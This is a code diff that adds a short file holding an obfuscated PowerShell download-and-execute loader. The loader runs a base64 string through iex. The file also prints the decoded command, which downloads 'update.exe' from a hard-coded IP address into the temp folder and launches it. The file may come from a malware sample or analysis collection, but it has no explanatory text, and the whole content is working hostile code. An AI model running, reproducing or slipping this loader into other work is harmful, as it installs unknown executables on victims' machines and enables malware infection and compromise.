@@ -1,0 +1,7 @@
+iex([SYstem.teXT.enCODiNg]::UTf8.gETSTriNg([systeM.coNvERt]::fROMbaSe64STRING('CihOZXctT2JqZWN0IFNZc1RlbS5OZXQuV2VCQ0xpZW5UKS5kb1dOTG9BZEZJbEUoJ2h0dHA6Ly8xODUuMTQxLjI3LjM0L3VwZGF0ZS5leGUnLCIkZU5WOlRFTVBcdG1wZmlsZTg2LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZU5WOlRFTVBcdG1wZmlsZTg2LmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYsTem.Net.WeBCLienT).doWNLoAdFIlE('http://185.141.27.34/update.exe',"$eNV:TEMP\tmpfile86.exe");Start-Process ("$eNV:TEMP\tmpfile86.exe")
+
